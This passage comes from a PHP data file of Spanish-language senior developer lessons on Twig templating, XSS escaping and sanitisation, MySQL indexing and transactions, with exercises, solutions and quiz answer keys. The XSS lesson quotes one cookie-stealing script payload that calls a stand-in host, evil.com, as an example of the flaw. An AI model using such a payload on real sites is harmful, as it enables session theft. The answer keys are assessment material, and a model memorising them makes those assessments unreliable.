                            'Punto único de cambio: actualizar el diseño o accesibilidad de la alerta solo requiere modificar 1 línea en la macro.',
                            'Marcado semántico y atributos ARIA garantizados en el 100% de la aplicación.',
                            'Código de vista conciso y legible.',
                        ],
                        'trade_offs' => 'Requiere acordar una librería de componentes UI y convención de nombres con el equipo.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Helper de Componente Badge para Twig',
                    'objective' => 'Implementar una clase BadgeComponentHelper en PHP que valide las variantes permitidas (primary, success, warning, danger) y renderice un badge HTML accesible y seguro contra inyecciones.',
                    'instructions' => 'Implementa BadgeComponentHelper con la constante ALLOWED_VARIANTS = [\'primary\', \'success\', \'warning\', \'danger\'] y el método renderBadge(string $label, string $variant = \'primary\'): string. Si la variante no es válida, lanza una InvalidArgumentException. Escapa el texto del label con htmlspecialchars y retorna el marcado: <span class=\"badge badge-{$variant}\">{$escapedLabel}</span>.',
                    'filename' => 'BadgeComponentHelper.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse InvalidArgumentException;\n\nclass BadgeComponentHelper\n{\n    private const ALLOWED_VARIANTS = ['primary', 'success', 'warning', 'danger'];\n\n    public function renderBadge(string \$label, string \$variant = 'primary'): string\n    {\n        // TODO: Validar que \$variant esté en self::ALLOWED_VARIANTS o lanzar InvalidArgumentException\n        // TODO: Escapar \$label con htmlspecialchars para prevenir XSS\n        // Retornar <span class=\"badge badge-{\$variant}\">{\$escapedLabel}</span>\n        return '';\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse InvalidArgumentException;\n\nclass BadgeComponentHelper\n{\n    private const ALLOWED_VARIANTS = ['primary', 'success', 'warning', 'danger'];\n\n    public function renderBadge(string \$label, string \$variant = 'primary'): string\n    {\n        if (!in_array(\$variant, self::ALLOWED_VARIANTS, true)) {\n            throw new InvalidArgumentException(sprintf('Variante no válida: %s. Permitidas: %s', \$variant, implode(', ', self::ALLOWED_VARIANTS)));\n        }\n\n        \$escapedLabel = htmlspecialchars(\$label, ENT_QUOTES, 'UTF-8');\n\n        return sprintf('<span class=\"badge badge-%s\">%s</span>', \$variant, \$escapedLabel);\n    }\n}\n",
                    'explanation' => 'Los componentes visuales deben encapsular validación de contratos estrictos para prevenir renderizados con estilos inexistentes o inyecciones de código malicioso en el DOM. Centralizar esta lógica garantiza consistencia en toda la capa de presentación.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Bloques, Macros y Composición en Twig',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Qué función cumple la llamada `{{ parent() }}` dentro de un bloque `{% block javascripts %}` en una plantilla hija?',
                            'options' => [
                                'a' => 'Ejecuta el bloque padre en una transacción SQL separada.',
                                'b' => 'Renderiza el contenido original del bloque definido en la plantilla padre, permitiendo anexar nuevos scripts sin eliminar los scripts base del layout.',
                                'c' => 'Reinicia el contexto de variables de la petición.',
                                'd' => 'Cierra la etiqueta HTML del bloque.',
                            ],
                            'correct' => 'b',
                            'explanation' => '{{ parent() }} invoca el contenido del bloque correspondiente en la clase padre compilada. Es indispensable para que páginas secundarias añadan hojas de estilo o librerías JS específicas sin perder las globales.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Por qué es una buena práctica Senior utilizar el modificador `only` en directivas `{% include \'partial.html.twig\' with { user: u } only %}`?',
                            'options' => [
                                'a' => 'Porque hace que la plantilla se ejecute más rápido en Python.',
                                'b' => 'Aisla el contexto de la plantilla incluida: previene que acceda o dependa inadvertidamente de variables globales de la página principal, garantizando que sea un componente puro y predecible.',
                                'c' => 'Porque sin `only` Twig no compila la plantilla en Linux.',
                                'd' => 'Porque cifra el archivo en disco.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Por defecto, include comparte todo el array $context. El modificador only rompe este acoplamiento implícito, asegurando que el componente reciba únicamente los datos que declara explícitamente.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Cuál es la principal ventaja de las macros (`{% macro %}`) frente a incluir plantillas sueltas con `include`?',
                            'options' => [
                                'a' => 'Las macros operan como funciones puras con argumentos explícitos, importables bajo un namespace (ej. `{% import \"macros.html.twig\" as ui %}`), ofreciendo encapsulación estricta y reusabilidad modular.',
                                'b' => 'Las macros permiten consultar bases de datos remotas.',
                                'c' => 'Las macros evitan el uso de CSS en la página.',
                                'd' => 'Las macros son obligatorias en Symfony 7.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Las macros en Twig son análogas a funciones de utilidad en programación: encapsulan marcado, reciben argumentos nominales tipados y no contaminan el contexto global de la vista.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 4: LECCIÓN 3: Auto-escaping, Contextos Seguros & XSS Defense
            // ==========================================
            'twig-escaping-security' => [
                'slug' => 'twig-escaping-security',
                'title' => 'Auto-escaping, Contextos Seguros & XSS Defense',
                'module' => 'Twig Template Engine',
                'minutes' => 45,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'Twig incluye un subsistema de Auto-Escaping Contextual diseñado para prevenir ataques de Cross-Site Scripting (XSS). Por defecto, toda variable evaluada con {{ variable }} es tratada como no confiable y escapada para el contexto HTML. Sin embargo, los entornos de renderizado varían: atributos HTML, bloques <script>, reglas <style> y URLs requieren algoritmos de escape diferenciados para no romper los analizadores sintácticos del navegador.',
                    'problem' => 'El uso irresponsable y peligroso del filtro |raw. Desarrolladores que, al observar entidades HTML escapadas (&lt;b&gt;), aplican indiscriminadamente |raw sobre entradas de usuario (comentarios, nombres, biografías), abriendo vectores críticos de XSS almacenado o reflejado que permiten a atacantes robar cookies de sesión HttpOnly y tokens de autenticación.',
                    'solution' => 'Tolerancia cero a |raw no auditado en Code Reviews Senior. Para renderizar contenido enriquecido (Markdown/WYSIWYG), utilizar la librería defensiva Symfony HtmlSanitizer (HtmlSanitizerInterface) con una allowlist estricta de etiquetas y atributos seguros antes de pasarlo a la vista. Para contextos no HTML, seleccionar explícitamente la estrategia de escape adecuada (e(\'js\'), e(\'css\'), e(\'url\'), e(\'html_attr\')).',
                    'problem_label' => 'El Riesgo Crítico del Filtro |raw y Falsas Suposiciones de Seguridad:',
                    'solution_label' => 'La Solución: Auto-Escaping Contextual y HtmlSanitizer Defensivo:',
                ],
                'internals' => [
                    'title' => 'Arquitectura del Motor de Escapado y Contextos Seguros',
                    'steps' => [
                        [
                            'phase' => '1. EscaperRuntime & Compilación de {{ var }}',
                            'description' => 'Twig compila la expresión {{ var }} invocando al EscaperRuntime de forma transparente: \$this->env->getRuntime(EscaperRuntime::class)->escape(\$var, \'html\', null, true). Convierte caracteres especiales (<, >, &, \", \') en entidades seguras.',
                        ],
                        [
                            'phase' => '2. El Contexto JavaScript (e(\'js\'))',
                            'description' => 'En un bloque <script>, escapar caracteres como entidades HTML (&lt;) no evita inyecciones XSS. La estrategia \"js\" convierte caracteres especiales y comillas a secuencias de escape unicode (\\u0022, \\u0027, \\u005C), neutralizando roturas de strings en el script.',
                        ],
                        [
                            'phase' => '3. El Contexto de Atributos HTML (e(\'html_attr\'))',
                            'description' => 'Protege valores incrustados en atributos HTML (<div data-user=\"{{ var|e(\'html_attr\') }}\">) contra caracteres de espacio o comillas no balanceadas que permitirían inyectar nuevos atributos como onmouseover=.',
                        ],
                        [
                            'phase' => '4. Escaping vs Sanitization (Symfony HtmlSanitizer)',
                            'description' => 'El escapado transforma texto en entidades para evitar interpretación; la sanitización (HtmlSanitizer) analiza el árbol DOM real del HTML, desinfecta tags peligrosos (<script>, <iframe>, <object>) y atributos de evento (onload, onerror), permitiendo solo elementos aprobados.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Security/Sanitizer/RichTextSanitizer.php',
                    'title' => 'Sanitizador de Texto Enriquecido con Allowlist Estricta en Symfony',
                    'tag' => 'Symfony HtmlSanitizer Defense',
                    'code' => "declare(strict_types=1);

namespace App\Security\Sanitizer;

use Symfony\Component\HtmlSanitizer\HtmlSanitizer;
use Symfony\Component\HtmlSanitizer\HtmlSanitizerConfig;

class RichTextSanitizer
{
    private HtmlSanitizer \$sanitizer;

    public function __construct()
    {
        \$config = (new HtmlSanitizerConfig())
            ->allowSafeElements()
            ->allowElement('p')
            ->allowElement('strong')
            ->allowElement('em')
            ->allowElement('code')
            ->allowElement('pre')
            ->allowElement('a', ['href', 'title'])
            ->allowItem('a', 'target', ['_blank'])
            ->allowLinkSchemes(['http', 'https', 'mailto'])
            ->blockElement('script')
            ->blockElement('iframe');

        \$this->sanitizer = new HtmlSanitizer(\$config);
    }

    public function sanitize(string \$untrustedHtml): string
    {
        return \$this->sanitizer->sanitize(\$untrustedHtml);
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'En una revisión de código Senior, cualquier aparición de `|raw` es tratada como una alarma de seguridad de nivel máximo (Code Red). Un Senior no asume que los datos están limpios porque provengan de la base de datos o de un usuario autenticado. La premisa es Zero-Trust: si una entrada necesita contener formato HTML, debe atravesar un pipeline formal de sanitización (HtmlSanitizer) con allowlist restrictiva y validación de esquemas URL antes de ser renderizada.',
                    'critical_questions' => [
                        '¿Este filtro |raw está renderizando datos que en algún punto provienen de una entrada de usuario o parámetro de URL?',
                        '¿Estamos usando el contexto de escape adecuado (html, js, css, html_attr) según la ubicación de la variable en el DOM?',
                        '¿Nuestra aplicación tiene configurada una cabecera Content-Security-Policy (CSP) estricta como segunda línea de defensa?',
                        '¿Podemos sustituir |raw por una extensión que utilice HtmlSanitizer para permitir únicamente elementos de formato seguros?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Mostrar biografías y comentarios de usuarios que pueden contener formato enriquecido (negrita, enlaces y cursiva).',
                    'junior' => [
                        'approach' => 'Para evitar que se vean etiquetas en texto plano escribe: `<div class=\"bio\">{{ user.bio|raw }}</div>`.',
                        'flaws' => [
                            'Vulnerabilidad crítica XSS Stored: un atacante guarda `<script>fetch(\'https://evil.com?c=\' + document.cookie)</script>` como biografía y compromete la sesión de cualquier usuario que visite su perfil.',
                            'Permite secuestro de clics mediante `<iframe>` maliciosos y falsificación de peticiones.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Procesa la biografía a través de un servicio de aplicación que ejecuta `HtmlSanitizer` con allowlist estricta (solo `<strong>`, `<em>`, `<a>` con esquemas seguros `https:`). La salida sanitizada es segura y la aplicación cuenta con Content-Security-Policy (CSP).',
                        'rationale' => [
                            'Inmune a inyecciones XSS: cualquier etiqueta peligrosa o atributo de evento es erradicado del DOM.',
                            'Defensa en profundidad: la sanitización protege la vista y la cabecera CSP bloquea la ejecución de scripts no autorizados.',
                        ],
                        'trade_offs' => 'Requiere configurar y mantener la dependencia de Symfony HtmlSanitizer.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Sanitizador de Contenido Defensivo contra XSS',
                    'objective' => 'Implementar un sanitizador de contenido defensivo (SafeContentSanitizer) que erradique scripts, pseudo-protocolos maliciosos y atributos de evento, permitiendo únicamente etiquetas seguras.',
                    'instructions' => 'Implementa SafeContentSanitizer con la constante ALLOWED_TAGS = [\'<p>\', \'<br>\', \'<strong>\', \'<em>\', \'<code>\'] y el método sanitize(string $untrustedHtml): string. Si la entrada contiene \'<script\' o \'javascript:\' (sin importar mayúsculas/minúsculas), lanza una InvalidArgumentException. Sanitiza el contenido permitiendo únicamente ALLOWED_TAGS y erradicando atributos de evento peligrosos (ej. onclick, onerror).',
                    'filename' => 'SafeContentSanitizer.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse InvalidArgumentException;\n\nclass SafeContentSanitizer\n{\n    private const ALLOWED_TAGS = ['<p>', '<br>', '<strong>', '<em>', '<code>'];\n\n    public function sanitize(string \$untrustedHtml): string\n    {\n        // TODO 1: Si contiene '<script' o 'javascript:', lanzar InvalidArgumentException\n        // TODO 2: Sanitizar permitiendo únicamente self::ALLOWED_TAGS y eliminando atributos on*\n        // Retornar el string limpio y seguro\n        return '';\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse InvalidArgumentException;\n\nclass SafeContentSanitizer\n{\n    private const ALLOWED_TAGS = ['<p>', '<br>', '<strong>', '<em>', '<code>'];\n\n    public function sanitize(string \$untrustedHtml): string\n    {\n        if (stripos(\$untrustedHtml, '<script') !== false || stripos(\$untrustedHtml, 'javascript:') !== false) {\n            throw new InvalidArgumentException('Contenido malicioso detectado: scripts y pseudo-protocolos prohibidos.');\n        }\n\n        \$clean = strip_tags(\$untrustedHtml, self::ALLOWED_TAGS);\n\n        return preg_replace('/\\s+on\\w+\\s*=\\s*([\"\\\']).*?\\1/i', '', \$clean) ?? \$clean;\n    }\n}\n",
                    'explanation' => 'Un sanitizador defensivo aplica una política de lista blanca (allowlist) estricta. Al erradicar activamente scripts, vectores basados en atributos de eventos inline y pseudo-protocolos peligrosos, se neutralizan ataques de Cross-Site Scripting (XSS) sin comprometer el formateo seguro.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Auto-escaping y Seguridad Defensiva en Twig',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Por qué el filtro `|raw` está estrictamente desaconsejado en revisiones de código de nivel Senior para entradas de usuario?',
                            'options' => [
                                'a' => 'Porque hace que Twig compile más lento.',
                                'b' => 'Desactiva por completo el auto-escaping de Twig, permitiendo que un atacante inyecte código JavaScript malicioso (ataque XSS) que se ejecutará en el navegador de otros usuarios.',
                                'c' => 'Porque solo es compatible con PHP 7.0.',
                                'd' => 'Porque altera el diseño responsive en dispositivos móviles.',
                            ],
                            'correct' => 'b',
                            'explanation' => '|raw marca la variable como segura sin realizar ninguna verificación. Si contiene datos no confiables de un usuario o de una API externa, abre una vulnerabilidad crítica XSS directa.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Por qué debe utilizarse el filtro de escape contextual `|e(\'js\')` cuando se incrusta una variable PHP dentro de un bloque `<script>`?',
                            'options' => [
                                'a' => 'Porque el escape HTML tradicional (&quot;, &lt;) no evita que caracteres de escape y comillas rompan cadenas en JavaScript e inyecten sentencias ejecutables.',
                                'b' => 'Porque JavaScript no soporta cadenas de texto sin ese filtro.',
                                'c' => 'Para convertir el código PHP a TypeScript automáticamente.',
                                'd' => 'Para enviar la variable a un servidor WebSocket.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'En el contexto JavaScript, escapar caracteres como entidades HTML es inútil porque el motor JS no procesa entidades HTML dentro de literales de cadena; se requiere escape unicode hexadecimal.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Cuál es la diferencia fundamental entre "escapar" una variable (escaping) y "sanitizar" HTML (sanitization con HtmlSanitizer)?',
                            'options' => [
                                'a' => 'Escapar transforma caracteres especiales en entidades para que el navegador los muestre como texto sin interpretarlos; sanitizar inspecciona el árbol DOM real, destruyendo etiquetas y atributos peligrosos pero preservando las etiquetas de formato autorizadas.',
                                'b' => 'Escapar se hace en el servidor y sanitizar se hace en la base de datos.',
                                'c' => 'Son exactamente la misma operación con diferente nombre.',
                                'd' => 'La sanitización solo sirve para números enteros.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'Escapar convierte todo a texto seguro; sanitizar permite renderizar HTML real seguro (como negritas o enlaces) filtrando activamente elementos maliciosos mediante una política de allowlist.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 5: BASES DE DATOS & SQL DE ALTO RENDIMIENTO
            // ==========================================

            // ==========================================
            // NIVEL 5: LECCIÓN 1: Estrategias de Índices & Dominio de EXPLAIN
            // ==========================================
            'sql-indexing-explain' => [
                'slug' => 'sql-indexing-explain',
                'title' => 'Estrategias de Índices & Dominio de EXPLAIN',
                'module' => 'Bases de Datos & SQL',
                'minutes' => 50,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'En MySQL (motor InnoDB), los índices no son filtros mágicos: son estructuras de datos en árbol balanceado (B+Tree) organizadas en páginas de 16KB que permiten búsquedas logarítmicas O(log N) en lugar de escaneos completos de tabla O(N) (Full Table Scans). Un desarrollador Senior diseña índices basándose en la selectividad de columnas, la regla del prefijo más a la izquierda (Leftmost Prefix Rule) y la construcción de Índices de Cobertura (Covering Indexes) donde Extra: Using index certifica que la consulta se resuelve íntegramente en la memoria del índice sin tocar las páginas de datos en disco.',
                    'problem' => 'Consultas lentas que colapsan la base de datos en producción por falta de sargabilidad (Non-Sargable Queries). Por ejemplo: aplicar funciones o transformaciones sobre columnas indexadas (WHERE YEAR(created_at) = 2025 o WHERE LOWER(email) = ?), usar comodines a la izquierda (LIKE "%ter"), o crear índices compuestos en el orden equivocado, anulando el B+Tree y forzando a MySQL a leer millones de filas de disco.',
                    'solution' => 'Dominar el comando EXPLAIN y EXPLAIN ANALYZE en MySQL 8.0 para auditar el plan del optimizador de costos. Aplicar la regla \"Igualdad primero, luego Rango\" (Equality -> Range) en índices compuestos, reescribir consultas no sargables en rangos binarios precisos y diseñar índices de cobertura para eliminar Bookmark Lookups.',
                    'problem_label' => 'El Antipatrón de Consultas No Sargables y Escaneos de Tabla Masivos:',
                    'solution_label' => 'La Solución: Índices B+Tree Compuestos, Sargabilidad y Auditoría con EXPLAIN:',
                ],
                'internals' => [
                    'title' => 'Anatomía de un B+Tree en InnoDB y el Cost-Based Optimizer',
                    'steps' => [
                        [
                            'phase' => '1. Clustered Index (PK) vs Índices Secundarios',
                            'description' => 'En InnoDB, la tabla es el Clustered Index: los nodos hoja contienen las filas completas. Un índice secundario almacena los valores de sus columnas más la Primary Key. Salvo que sea un Covering Index, toda búsqueda secundaria requiere un segundo salto (Double B-Tree Lookup) para leer la fila completa.',
                        ],
                        [
                            'phase' => '2. Regla del Prefijo Más a la Izquierda (Leftmost Prefix)',
                            'description' => 'Un índice compuesto en (tenant_id, status, created_at) acelera filtros por (tenant_id), (tenant_id, status) y (tenant_id, status, created_at). No puede usarse para filtrar únicamente por (status) o (created_at) sin tenant_id.',
                        ],
                        [
                            'phase' => '3. Predicados No Sargables (Search Argument Able)',
                            'description' => 'Cualquier función sobre una columna (DATE(col), YEAR(col), ABS(col), LIKE \"%abc\") destruye la posibilidad de navegación binaria en el árbol. La consulta se degrada inevitablemente a escaneo de tabla completo (type: ALL).',
                        ],
                        [
                            'phase' => '4. Decodificación de EXPLAIN en MySQL 8.0',
                            'description' => 'Tipos de acceso ordenados de óptimo a crítico: const > eq_ref > ref > range > index > ALL. Un Senior erradica type: ALL en tablas con más de 1,000 registros y elimina Using filesort y Using temporary en las consultas más frecuentes.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Database/Repository/OrderOptimizedRepository.php',
                    'title' => 'Repositorio con Consultas Sargables e Índices Compuestos en MySQL 8.0',
                    'tag' => 'MySQL 8.0 Indexing Strategy',
                    'code' => "declare(strict_types=1);

namespace App\Database\Repository;

use Doctrine\DBAL\Connection;

class OrderOptimizedRepository
{
    public function __construct(
        private readonly Connection \$connection
    ) {}

    /**
     * Consulta sargable utilizando el índice compuesto idx_tenant_status_created (tenant_id, status, created_at)
     * Extrae pedidos del tenant con rango de fechas sin invalidar el B+Tree.
     */
    public function findCompletedOrdersByTenantAndYear(int \$tenantId, int \$year): array
    {
        // Predicado sargable con rango explícito: evita YEAR(created_at) = :year
        \$startDate = sprintf('%04d-01-01 00:00:00', \$year);
        \$endDate = sprintf('%04d-12-31 23:59:59', \$year);

        \$sql = '
            SELECT id, tenant_id, customer_id, total_cents, status, created_at
            FROM orders
            WHERE tenant_id = :tenantId
              AND status = :status
              AND created_at BETWEEN :startDate AND :endDate
            ORDER BY created_at DESC
            LIMIT 50
        ';

        return \$this->connection->fetchAllAssociative(\$sql, [
            'tenantId' => \$tenantId,
            'status' => 'COMPLETED',
            'startDate' => \$startDate,
            'endDate' => \$endDate,
        ]);
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior nunca añade índices por intuición o de forma reactiva tras cada queja de lentitud. Ejecuta `EXPLAIN ANALYZE` para ver los costos reales de CPU, lectura de páginas y tiempos de ejecución. Comprende que cada índice secundario acelera las lecturas (`SELECT`), pero penaliza severamente las inserciones (`INSERT`), actualizaciones (`UPDATE`) y borrados (`DELETE`) porque InnoDB debe rebalancear árboles B+Tree en disco e invalidar buffers.',
                    'critical_questions' => [
                        '¿Este índice compuesto respeta la regla de igualdad primero y rango al final (Equality -> Range)?',
                        '¿Estamos aplicando funciones o expresiones sobre columnas indexadas en la cláusula WHERE que rompan la sargabilidad?',
                        '¿El optimizador muestra type: ALL o Extra: Using filesort en una consulta que se ejecuta 1,000 veces por minuto?',
                        '¿Podemos transformar esta consulta en un Covering Index para evitar los Bookmark Lookups al Clustered Index?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Consultar los pedidos completados en el año 2025 de un cliente específico en una tabla con 15 millones de filas.',
                    'junior' => [
                        'approach' => 'Escribe: `WHERE customer_id = 42 AND YEAR(created_at) = 2025 AND status = "COMPLETED"`. Añade 3 índices individuales independientes: uno en customer_id, otro en created_at y otro en status.',
                        'flaws' => [
                            '`YEAR(created_at)` es no sargable: invalida el índice en created_at.',
                            'Tres índices individuales generan sobrecosto masivo de almacenamiento y escritura.',
                            'MySQL solo puede usar un índice por tabla en consultas complejas (o hacer un costoso Index Merge).',
                            'La consulta tarda más de 2.8 segundos y consume el 100% de la CPU del servidor MySQL.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Crea un único índice compuesto: `idx_customer_status_created (customer_id, status, created_at)`. Reescribe la consulta como predicado sargable: `WHERE customer_id = 42 AND status = "COMPLETED" AND created_at >= "2025-01-01" AND created_at < "2026-01-01"`.',
                        'rationale' => [
                            'Igualdades primero (`customer_id`, `status`), rango al final (`created_at`): el optimizador recorre el B+Tree en O(log N).',
                            'Un solo índice cubre el filtro y el ordenamiento sin necesidad de `filesort`.',
                            'Tiempo de respuesta: 1.2 milisegundos.',
                        ],
                        'trade_offs' => 'Requiere mantener índices compuestos planificados y evitar mutaciones en caliente de columnas indexadas.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Analizador y Reformulador de Consultas Sargables',
                    'objective' => 'Implementar una clase SargableQueryOptimizer que transforme predicados de fecha no sargables en rangos seguros para el B+Tree y valide tipos de acceso óptimos de EXPLAIN.',
                    'instructions' => 'Implementa SargableQueryOptimizer con el método optimizeYearPredicate(string $column, int $year): string. Si $year <= 1970, lanza una InvalidArgumentException. Retorna la condición sargable: {$column} >= "YYYY-01-01 00:00:00" AND {$column} <= "YYYY-12-31 23:59:59". Implementa además isOptimalAccessType(string $accessType): bool que retorne true únicamente para los tipos óptimos ("const", "eq_ref", "ref", "range").',
                    'filename' => 'SargableQueryOptimizer.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse InvalidArgumentException;\n\nclass SargableQueryOptimizer\n{\n    public function optimizeYearPredicate(string \$column, int \$year): string\n    {\n        // TODO: Validar que \$year > 1970 o lanzar InvalidArgumentException\n        // Retornar predicado sargable con rango: {\$column} >= \"YYYY-01-01 00:00:00\" AND {\$column} <= \"YYYY-12-31 23:59:59\"\n        return '';\n    }\n\n    public function isOptimalAccessType(string \$accessType): bool\n    {\n        // TODO: Retornar true si \$accessType está en ['const', 'eq_ref', 'ref', 'range']\n        return false;\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Challenge;\n\nuse InvalidArgumentException;\n\nclass SargableQueryOptimizer\n{\n    private const OPTIMAL_ACCESS_TYPES = ['const', 'eq_ref', 'ref', 'range'];\n\n    public function optimizeYearPredicate(string \$column, int \$year): string\n    {\n        if (\$year <= 1970) {\n            throw new InvalidArgumentException('El año para el predicado sargable debe ser mayor a 1970.');\n        }\n\n        \$cleanCol = preg_replace('/[^a-zA-Z0-9_]/', '', \$column);\n\n        return sprintf(\n            '%s >= \"%04d-01-01 00:00:00\" AND %s <= \"%04d-12-31 23:59:59\"',\n            \$cleanCol,\n            \$year,\n            \$cleanCol,\n            \$year\n        );\n    }\n\n    public function isOptimalAccessType(string \$accessType): bool\n    {\n        return in_array(strtolower(trim(\$accessType)), self::OPTIMAL_ACCESS_TYPES, true);\n    }\n}\n",
                    'explanation' => 'Un predicado sargable permite al optimizador de MySQL navegar directamente por las ramas del B+Tree usando comparaciones de rango binarias, reduciendo el escaneo de millones de páginas a unos pocos milisegundos.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Índices B+Tree, Sargabilidad y Planes EXPLAIN',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => 'Dado un índice compuesto `idx_users (tenant_id, status, created_at)`, ¿cuál de las siguientes consultas NO puede utilizar el índice de forma eficiente?',
                            'options' => [
                                'a' => 'WHERE tenant_id = 1 AND status = "ACTIVE"',
                                'b' => 'WHERE status = "ACTIVE" AND created_at > "2025-01-01"',
                                'c' => 'WHERE tenant_id = 1',
                                'd' => 'WHERE tenant_id = 1 AND status = "ACTIVE" AND created_at > "2025-01-01"',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Regla del prefijo más a la izquierda (Leftmost Prefix Rule): el índice compuesto solo puede utilizarse si el filtro incluye la columna principal inicial (tenant_id). Sin tenant_id, el B+Tree no puede orientar la búsqueda binaria.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => 'En la salida de `EXPLAIN` de MySQL 8.0, ¿cuál de los siguientes tipos de acceso (`type`) indica el PEOR rendimiento posible?',
                            'options' => [
                                'a' => 'range',
                                'b' => 'ref',
                                'c' => 'eq_ref',
                                'd' => 'ALL',
                            ],
                            'correct' => 'd',
                            'explanation' => 'type: ALL representa un Full Table Scan (escaneo completo de tabla). MySQL debe leer todas las filas de disco de la primera a la última, saturando el Buffer Pool de InnoDB.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Qué significa que una consulta se resuelva como un "Covering Index" (mostrando `Using index` en la columna `Extra` de EXPLAIN)?',
                            'options' => [
                                'a' => 'Que la consulta se resolvió en la tarjeta gráfica del servidor.',
                                'b' => 'Que todas las columnas solicitadas en el SELECT y en el WHERE están presentes dentro del propio índice secundario, por lo que InnoDB no necesita leer las páginas de datos de la tabla (evita el Bookmark Lookup).',
                                'c' => 'Que la tabla fue bloqueada para lectura exclusiva.',
                                'd' => 'Que la base de datos eliminó el índice tras ejecutar la consulta.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Un Covering Index proporciona el máximo rendimiento de lectura porque el motor obtiene todos los datos solicitados directamente de las páginas de memoria del índice B+Tree, con cero lecturas al Clustered Index de la tabla.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 5: LECCIÓN 2: Transacciones ACID & Niveles de Aislamiento
            // ==========================================
            'sql-transactions-isolation' => [
                'slug' => 'sql-transactions-isolation',
                'title' => 'Transacciones ACID & Niveles de Aislamiento',
                'module' => 'Bases de Datos & SQL',
                'minutes' => 50,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'Las transacciones relacionales garantizan las 4 propiedades ACID (Atomicidad, Consistencia, Aislamiento y Durabilidad). De ellas, el Aislamiento (Isolation) es el desafío de ingeniería más crítico bajo alta concurrencia. El estándar ANSI/ISO SQL define 4 niveles de aislamiento: READ UNCOMMITTED, READ COMMITTED, REPEATABLE READ (nivel por defecto en MySQL InnoDB) y SERIALIZABLE. Cada nivel mitiga fenómenos anómalos específicos (Dirty Reads, Non-Repeatable Reads, Phantom Reads) a cambio de mayor contención de bloqueos.',
                    'problem' => 'Condiciones de carrera (Race Conditions) catastróficas en sistemas transaccionales: sobreventas de inventario por debajo de stock cero (Overselling), duplicación de cobros en pasarelas de pago y bloqueos mutuos mortales (Deadlocks) no gestionados que provocan errores HTTP 500 cuando múltiples peticiones concurrentes intentan mutar los mismos registros simultáneamente.',
                    'solution' => 'Dominar los mecanismos de concurrencia de InnoDB: control de versiones multiversión (MVCC) mediante Undo Logs, bloqueos pesimistas exclusivos (SELECT ... FOR UPDATE) para operaciones de saldo/stock crítico en transacciones breves, bloqueos optimistas (columnas de versión) para lecturas intensivas, y patrones de reintento automático con retroceso exponencial ante Deadlocks (código de error 1213).',
                    'problem_label' => 'El Antipatrón de Concurrencia Ciega y Condiciones de Carrera en Stock:',
                    'solution_label' => 'La Solución: Niveles de Aislamiento, Bloqueo Pesimista FOR UPDATE y Manejo de Deadlocks:',
                ],
                'internals' => [
                    'title' => 'Mecánica de MVCC, Bloqueos en InnoDB y Prevención de Deadlocks',
                    'steps' => [
                        [
                            'phase' => '1. MVCC (Multi-Version Concurrency Control) & Read Views',
                            'description' => 'InnoDB no bloquea las lecturas simples (SELECT sin lock). Usa los Undo Logs para reconstruir instantáneas históricas consistentes según el Read View de la transacción: las lecturas nunca bloquean las escrituras y las escrituras nunca bloquean las lecturas.',
                        ],
                        [
                            'phase' => '2. Record Locks, Gap Locks & Next-Key Locks',
                            'description' => 'Para evitar lecturas fantasma en REPEATABLE READ, InnoDB emplea Next-Key Locking: bloquea tanto el registro existente del índice (Record Lock) como el espacio libre previo (Gap Lock), impidiendo que otras transacciones inserten filas en ese intervalo.',
                        ],
                        [
                            'phase' => '3. Bloqueo Pesimista: SELECT ... FOR UPDATE',
                            'description' => 'Adquiere un bloqueo exclusivo (X-Lock) sobre las filas seleccionadas, forzando a transacciones concurrentes a esperar hasta que se ejecute COMMIT o ROLLBACK. Obligatorio mantener la transacción abierta la mínima fracción de segundo posible (sin llamadas a APIs externas dentro del lock).',
                        ],
                        [
                            'phase' => '4. Detección y Mitigación de Deadlocks',
